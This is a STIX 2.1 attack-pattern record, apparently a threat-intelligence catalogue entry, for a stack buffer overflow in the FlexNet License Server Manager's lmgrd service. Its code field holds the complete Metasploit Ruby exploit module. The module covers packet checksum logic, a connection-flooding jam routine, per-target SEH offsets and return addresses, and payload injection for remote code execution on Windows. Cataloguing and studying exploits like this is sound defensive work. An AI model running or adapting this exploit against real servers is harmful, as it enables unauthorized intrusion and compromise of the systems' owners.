{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9299498a-dfda-42c9-90c2-6231ab0d5feb",
    "created": "2024-08-14T16:48:44.883684Z",
    "modified": "2024-08-14T16:48:44.883688Z",
    "name": "FlexNet License Server Manager lmgrd Buffer Overflow",
    "description": " This module exploits a vulnerability in the FlexNet License Server Manager.  The vulnerability is due to the insecure usage of memcpy in the lmgrd service when handling network packets, which results in a stack buffer overflow.  In order to improve reliability, this module will make lots of connections to lmgrd during each attempt to maximize its success. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/license/flexnet_lmgrd_bof.rb",
            "external_id": "flexnet_lmgrd_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/lmgrd_1-adv.txt"
        },
        {
            "source_name": "reference",
            "url": "http://www.flexerasoftware.com/pl/13057.htm#Vendoradvisory"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'FlexNet License Server Manager lmgrd Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability in the FlexNet\n        License Server Manager.\n\n        The vulnerability is due to the insecure usage of memcpy\n        in the lmgrd service when handling network packets, which\n        results in a stack buffer overflow.\n\n        In order to improve reliability, this module will make lots of\n        connections to lmgrd during each attempt to maximize its success.\n      },\n      'Author'         =>\n        [\n          'Luigi Auriemma', # Vulnerability Discovery and PoC\n          'Alexander Gavrun', # Vulnerability Discovery\n          'juan vazquez', # Metasploit module\n          'sinn3r' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '81899' ],\n          [ 'BID', '52718' ],\n          [ 'ZDI', '12-052' ],\n          [ 'URL', 'http://aluigi.altervista.org/adv/lmgrd_1-adv.txt' ],\n          [ 'URL', 'http://www.flexerasoftware.com/pl/13057.htm' ] # Vendor advisory\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Payload' =>\n        {\n          'Space' => 4000\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Debug', {} ],\n          [ 'Autodesk Licensing Server Tools 11.5 / lmgrd 11.5.0.0 / Windows XP SP3',\n            {\n              'Offset' => 10476,\n              'ShellcodeOffset' => 5484,\n              'Ret' => 0x0047d01f # ppr from lmgrd.exe\n            }\n          ],\n          [ 'Alias License Tools 10.8.0.7 / lmgrd 10.8.0.7 / Windows XP SP3',\n            {\n              'Offset' => 7324,\n              'ShellcodeOffset' => 2332,\n              'Ret' => 0x004eda91 # ppr from lmgrd.exe\n            }\n          ],\n          [ 'Alias License Tools 10.8 / lmgrd 10.8.0.2 / Windows XP SP3',\n            {\n              'Offset' => 7320,\n              'ShellcodeOffset' => 2328,\n              'Ret' => 0x004eb2e1 # ppr from lmgrd.exe\n            }\n          ],\n        ],\n      'DefaultTarget'  => 1,\n      'DisclosureDate' => '2012-03-23'))\n\n    register_options(\n      [\n        Opt::RPORT(27000),\n        OptInt.new('Attempts', [ true, 'Number of attempts for the exploit phase', 20 ]),\n        OptInt.new('Wait', [ true, 'Delay between brute force attempts', 2 ]),\n        OptInt.new('Jam', [ true, 'Number of requests to jam the server', 100 ])\n      ])\n  end\n\n  def header_checksum(packet)\n    packet_bytes = packet.unpack(\"C*\")\n    checksum = packet_bytes[0]\n    i = 2\n    while i < 0x14\n      checksum = checksum + packet_bytes[i]\n      i = i + 1\n    end\n    return (checksum & 0x0FF)\n  end\n\n  def data_checksum(packet_data)\n    word_table = \"\"\n    i = 0\n    while i < 256\n      v4 = 0\n      v3 = i\n      j = 8\n\n      while j > 0\n        if ((v4 ^ v3) & 1) == 1\n          v4 = ((v4 >> 1) ^ 0x3A5D) & 0x0FFFF\n        else\n          v4 = (v4 >> 1) & 0x0FFFF\n        end\n        v3 >>= 1\n        j = j - 1\n      end\n\n      word_table << [v4].pack(\"S\")\n      i = i + 1\n    end\n    k = 0\n    checksum = 0\n    data_bytes = packet_data.unpack(\"C*\")\n    word_table_words = word_table.unpack(\"S*\")\n    while k < packet_data.length\n      position = data_bytes[k] ^ (checksum & 0x0FF)\n      checksum = (word_table_words[position] ^ (checksum >> 8)) & 0x0FFFF\n      k = k + 1\n    end\n    return checksum\n  end\n\n  def create_packet(data)\n    pkt = \"\\x2f\"\n    pkt << \"\\x00\" # header checksum\n    pkt << \"\\x00\\x00\" # data checksum\n    pkt << \"\\x00\\x00\" # pkt length\n    pkt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt << data\n\n    pkt[4,2] = [pkt.length].pack(\"n\")\n\n    data_sum = data_checksum(pkt[4, pkt.length - 4])\n    pkt[2, 2] = [data_sum].pack(\"n\")\n\n    hdr_sum = header_checksum(pkt[0, 20])\n    pkt[1] = [hdr_sum].pack(\"C\")\n\n    return pkt\n  end\n\n  def jam\n    pkt = create_packet(\"\")\n\n    datastore['Jam'].times do\n      connect\n      sock.put(pkt)\n      disconnect\n    end\n  end\n\n  def exploit\n    i = 1\n    while i <= datastore['Attempts'] and not session_created?\n      print_status(\"Attempt #{i}/#{datastore['Attempts']} to exploit...\")\n      do_exploit\n      sleep(datastore['Wait'])\n      i = i + 1\n    end\n\n    if not session_created?\n      print_error(\"Exploit didn't work after #{i} attempts\")\n    end\n  end\n\n  def do_exploit\n    t = framework.threads.spawn(\"jam\", false) { jam }\n    my_payload = payload.encoded\n\n    header_length = 20 # See create_packet() to understand this number\n    pkt_data = \"\"\n    if target.name =~ /Debug/\n      pkt_data << \"a\" * (65535 - header_length)\n    else\n\n      pkt_data << rand_text(target['ShellcodeOffset'])\n      pkt_data << my_payload\n      pkt_data << rand_text(target['Offset']-target['ShellcodeOffset']-my_payload.length)\n      pkt_data << generate_seh_record(target.ret)\n      pkt_data << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-5000\").encode_string\n      pkt_data << rand_text(65535 - pkt_data.length - header_length)\n    end\n\n    pkt = create_packet(pkt_data)\n\n    connect\n    sock.put(pkt)\n    handler\n    disconnect\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2012-03-23",
    "x_mitre_platforms": [
        "win'"
    ]
}